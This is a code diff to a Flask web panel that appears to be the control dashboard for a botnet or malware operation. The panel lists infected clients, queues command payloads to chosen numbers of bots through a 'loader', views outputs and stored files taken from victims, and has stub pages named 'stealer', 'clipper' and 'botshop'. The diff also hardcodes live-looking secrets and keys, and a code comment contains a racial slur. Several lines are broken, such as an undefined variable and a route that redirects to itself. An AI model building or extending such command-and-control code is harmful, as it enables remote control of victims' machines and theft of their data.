@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, Response
+from flask import Flask, render_template, request, Response, make_response, redirect
 import httpx
 import json
 from cryptography.hazmat.primitives import padding
@@ -16,6 +16,27 @@ import magic
 # Fix individual not working
 # Add authentication
 
+def elapsed(start_timestamp, end_timestamp):
+    # Calculate the absolute difference in seconds
+    delta_seconds = abs(int(end_timestamp) - int(start_timestamp))
+
+    def add0(intInput):
+        intInput = str(intInput)
+        if len(intInput) == 1:
+            return " " + intInput
+        else:
+            return intInput
+
+    if delta_seconds < 60:
+        return f"{add0(delta_seconds)}s"
+    elif delta_seconds < 3600:
+        return f"{add0(delta_seconds // 60)}m"
+    elif delta_seconds < 86400:
+        return f"{add0(delta_seconds // 3600)}h"
+    else:
+        return f"{add0(delta_seconds // 86400)}d"
+
+
 def convert_to_ago(timestamp):
     def add0(intInput):
         intInput = str(intInput)
@@ -24,15 +45,18 @@ def convert_to_ago(timestamp):
         else:
             return intInput
 
-    delta = int(time.time()) - int(timestamp)
-    if delta <= 60 :
-        return f"{add0(int(delta))}s"
-    elif delta <= 3600:
-        return f"{add0(int(delta / 60))}m"
-    elif delta <= 86400:
-        return f"{add0(int(delta / 3600))}h"
+    # Calculate the absolute difference in seconds
+    delta_seconds = abs(int(time.time()) - int(timestamp))
+
+    # Convert seconds to minutes, hours, or days
+    if delta_seconds < 60:
+        return f"{add0(delta_seconds)}s ago"
+    elif delta_seconds < 3600:
+        return f"{add0(delta_seconds // 60)}m ago"
+    elif delta_seconds < 86400:
+        return f"{add0(delta_seconds // 3600)}h ago"
     else:
-        return f"{add0(int(delta / 86400))}d"
+        return f"{add0(delta_seconds // 86400)}d ago"
 
 def convert_to_future(timestamp):
     def add0(intInput):
@@ -57,19 +81,39 @@ def convert_to_future(timestamp):
         return f"In {add0(int(delta // 86400))}d"
 
 
-SERVER_ADDRESS = "http://127.0.0.1:9999"
-API_SECRET = "d102rf1q2-tgfv0ervjm_wj-d12D0-VNBNH-6HJW5N-R"
-HOST,PORT = "127.0.0.1", 6767
-GUEST_KEY = "djfop1jf1pgj1-f2j-12gj01-2g"
+SERVER_ADDRESS = "http://prod.kyun.li:80"
+API_SECRET = "d92u10-trffy9-h33h93j-ndhnj9gf3-h12-"
+HOST,PORT = "0.0.0.0", 1337
+GUEST_KEY = "ea18b75e40fca7dc382d0c3cbde44979aedbee6fbe2a83074b729105b4e217a9cfb3def98e33fe91029e86d5f9299d50e809a10c756d593f880715030ffdb8df"
+AUTH_KEY = "51d1f0286d6871d9907f5aedb5f6e3e08c9484e2aee662c9c8bc4b30fe62779550b8fc528271524d45c2a3ca9b0d43ba5609149c209444e028f5152d6cd2ebca"
 
 app = Flask(__name__)
 
+
+#    resp = make_response(render_template("clients.html", client_list=new_client_data, statistics=statistics))
+#    resp.set_cookie('authtoken', 'I am cookie')
+#    return resp 
+
+
+@app.route("/portal/<key>")
+def portal(key):
+
+    if key == GUEST_KEY:
+        return redirect(f"/guest/{GUEST_KEY}")
+
+    elif key == AUTH_KEY:
+        resp = make_response(redirect("/clients"))
+        resp.set_cookie('authtoken', AUTH_KEY)
+        return resp 
+    else:
+        return "no"
 
 @app.route("/guest/<guest_key>")
 def guest(guest_key):
 
     if guest_key != GUEST_KEY:
         return "nuh uh"
+        
     c_time = time.time()
     client_list_response = httpx.post(SERVER_ADDRESS + "/api/clients_list", json={"api_secret": API_SECRET})
     client_list = json.loads(client_list_response.text)
@@ -112,8 +156,12 @@ def guest(guest_key):
 
 @app.route("/clients")
 def clients():
+
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
+
     c_time = time.time()
     client_list_response = httpx.post(SERVER_ADDRESS + "/api/clients_list", json={"api_secret": API_SECRET})
+    print(client_list_response.content)
     client_list = json.loads(client_list_response.text)
 
     s_time = time.time()
@@ -153,10 +201,13 @@ def clients():
 
 @app.route("/builder")
 def builder():
+
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
     return render_template("builder.html")
 
 @app.route("/loader", methods=['GET', 'POST', 'DELETE'])
 def loader():
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
 
     if request.method == "POST":
 
@@ -184,13 +235,15 @@ def loader():
             json={
                 "api_secret": API_SECRET,
                 "cmd_type": execution_type,
-                "cmd_args": [payload, request.form.get("argument")], # nigga here 
+                "cmd_args": [payload, request.form.get("argument"), request.form.get("argument1"), request.form.get("argument2")], # nigga here 
                 "amount": int(amount),
                 "note": note,
                 "is_recursive": is_recursive
             },
             timeout=None
         )
+
+        print(f"{load_creation_response.content}")
 
     load_id = request.args.get('delete_load')
     if load_id != None:
@@ -205,15 +258,23 @@ def loader():
     new_load_data = []
     
     for load_id, load in load_list.items():
+
+        if load['cmd_args'].startswith("storage:"):\
+            cmd_args = f"Args are too long to be displayed. View them raw here: http://{HOST}:{PORT}/view/{load['cmd_args'].split("storage:")[1]}"
+        else:
+            cmd_args = data['cmd_args']
+
         load["percent_completed"] = int(100 * float(load["completed_amount"]) / float(load["required_amount"]))
         load["load_id"] = load_id
         load["time_issued"] = convert_to_ago(load["time_issued"])
+        load["cmd_args"] = cmd_args
         new_load_data.append(load)
 
     return render_template("loader.html", load_list=new_load_data)
 
 @app.route("/firewall")
 def firewall():
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
 
     block_id = request.args.get('delete_block')
     if block_id != None:
@@ -240,6 +301,7 @@ def firewall():
 
 @app.route("/server_logs")
 def server_logs():
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
 
     response = httpx.post(SERVER_ADDRESS + "/api/outputs_list", 
         json={"api_secret": API_SECRET}
@@ -256,7 +318,7 @@ def server_logs():
             
         new_outputs_list.append({
             "cmd_type": data['cmd_type'],
-            "time_to_complete": f'{data['time_recieved'] - data['time_issued']}s',
+            "time_to_complete": f'{elapsed(data['time_recieved'], data['time_issued'])}',
             "client_id": data['client_id'],
             "output": output,
             "time_recieved": data['time_recieved']
@@ -267,6 +329,7 @@ def server_logs():
 
 @app.route("/individual", methods=['GET', 'POST'])
 def individual():
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
 
     response = httpx.post(SERVER_ADDRESS + "/api/get_output", 
         json={
@@ -302,6 +365,7 @@ def individual():
 
 @app.route("/view/<storage_id>")
 def view(storage_id):
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
 
     response = httpx.post(SERVER_ADDRESS + "/api/parse_storage", 
         json={
@@ -312,10 +376,29 @@ def view(storage_id):
 
     mime = magic.from_buffer(response.content, mime=True)
     if mime.startswith('image'):
-        return Response(response.content, content_type='image/png')
+        return Response(response.content, content_type='image/png', cookies={"example": "cookie_value"})
     else:
         return Response(response.content, content_type='text/plain')
-            
+
+@app.route("/settings")
+def settings():
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
+    return redirect("/clients")            
+
+@app.route("/clipper")
+def clipper():
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
+    return redirect("/clients")
+    
+@app.route("/botshop")
+def botshop():
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
+    return redirect("/clients")
+
+@app.route("/stealer")
+def stealer():
+    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
+    return redirect("/stealer")
 
 
 app.run(HOST,PORT)
